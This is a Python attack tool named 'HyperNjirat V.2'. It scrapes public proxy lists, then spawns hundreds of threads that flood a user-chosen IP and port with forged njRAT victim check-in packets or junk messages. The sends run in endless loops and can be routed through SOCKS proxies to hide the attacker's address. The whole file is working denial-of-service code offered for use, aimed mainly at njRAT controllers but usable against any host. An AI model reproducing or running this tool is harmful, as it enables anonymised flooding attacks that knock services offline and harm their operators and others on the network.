import socket
import base64
import threading
import time
import random
import subprocess
import socks
import requests
def title():
    print('''
    __  __                      _   __  _            __ 
   / / / /_  ______  ___  _____/ | / / (_)________ _/ /_
  / /_/ / / / / __ \/ _ \/ ___/  |/ / / / ___/ __ `/ __/
 / __  / /_/ / /_/ /  __/ /  / /|  / / / /  / /_/ / /_  
/_/ /_/\__, / .___/\___/_/  /_/ |_/_/ /_/   \__,_/\__/  
      /____/_/                   /___/                  
                    V.2
                    By WachiraChoomsiri
\n''')

def getproxy():
    proxy = "proxy.txt"
    rsp = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&country=all')
    with open(str(proxy),'wb') as fp:
            fp.write(rsp.content)    
    
def ip():
    title()
    getproxy()
    global ip
    global njmode
    njmode = input("ATTACK MODE[Njrat/IPKiller] 0/1: ")
    ip = input("Enter Target IP: ")
    port()

def port():
    global port
    port = int(input("Enter Target Port: " ))
    proxymode()
    
def proxymode():
    global proxymode
    proxymode = int(input("Enter Socketmode(HideIP[off/on]) 0/1: " ))
    thread()
    
def thread():
    global thread_count
    thread_count = int(input("Enter Thread(800): " ))
    main()
    
def main():
    global go
    global x
    x = 0
    go = threading.Event()
    print()
    print('Wait 10 Sec')
    for x in range(thread_count):
        Flood(x + 1).start()
        print ("Thread:",str(x),"ready!")
    go.set()
    
class Flood(threading.Thread):

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self):
                time.sleep(10)
                delimiter = "|'|'|"
                msg_type = "ll"
                victim_string_prefix = "HacKed"
                vol_identifier = "F8CB008F"
                pc_name = "FuckU_SKIDD-PC"
                username = "5k1d_d357r0y3r"
                lm_time = "17-07-30"
                os_info = "Win 7 Enterprise N SP1 x64"
                cam = "No"
                ver = "0.7d"
                foreground_window = "NJRAT is for losers"
                registry_key_values = "b88ece4c04f706c9717bbe6fbda49ed2,2681e81bb4c4b3e6338ce2a456fb93a7,8e78a69ca187088abbea70727d268e90,"
                data = ""
                data += msg_type + delimiter
                gen_vol_id = ''.join([random.choice('0123456789ABCDEF') for x in range(8)])
                dataencodedBytes = victim_string_prefix + '_' + gen_vol_id
                encodedBytes = base64.b64encode(dataencodedBytes.encode("utf-8"))
                encodedStr = str(encodedBytes, "utf-8")
                data += encodedStr
                data += delimiter
                data += pc_name + delimiter
                data += username + delimiter
                data += "{:02d}-{:02d}-{:02d}".format(random.randint(0,19),random.randint(1,12),random.randint(1,31))
                data += delimiter + delimiter
                gen_os_ver = "Win {} {} SP{} {}".format(random.choice(["XP", "7", "8", "8.1", "10"]), random.choice(["Home Premium", "Pro", "Professional", "Ultimate", "Enterprise"]), random.randint(0, 3), random.choice(["x86", "x64"]))             
                data += gen_os_ver + delimiter
                data += random.choice(["No", "Yes"]) + delimiter
                data += "0.{}.{}".format(random.choice('123456789'), random.choice('abcde')) + delimiter
                data += ".." + delimiter                
                dataencodedBytes_foreground_window = foreground_window
                encodedBytes_foreground_window = base64.b64encode(dataencodedBytes_foreground_window.encode("utf-8"))
                encodedStr_foreground_window = str(encodedBytes, "utf-8")
                data += encodedStr_foreground_window
                data += delimiter
                data += registry_key_values
                if njmode == 0:
                    data_data = str(len(data)) + '\x00' + data
                else:
                    data_data = 'DM'
                current = x
                proxies = open('proxy.txt').readlines()
                proxy = random.choice(proxies).strip().split(":")   
                if proxymode == 1:
                    while True:
                        try:
                            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((ip, port))
                            s.send(str.encode(data_data))
                            data = s.recv(1024)
                            try:
                                for y in range(100):
                                    s.send(str.encode(data_data))
                            except:
                                s.close()
                        except:
                            s.close()
                else:
                    while True:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((ip, port))
                            s.send(str.encode(data_data))
                            data = s.recv(1024)
                            try:
                                for y in range(100):
                                    s.send(str.encode(data_data))
                            except:
                                s.close()
                        except:
                            s.close()				
				
if __name__ == "__main__":
    ip()
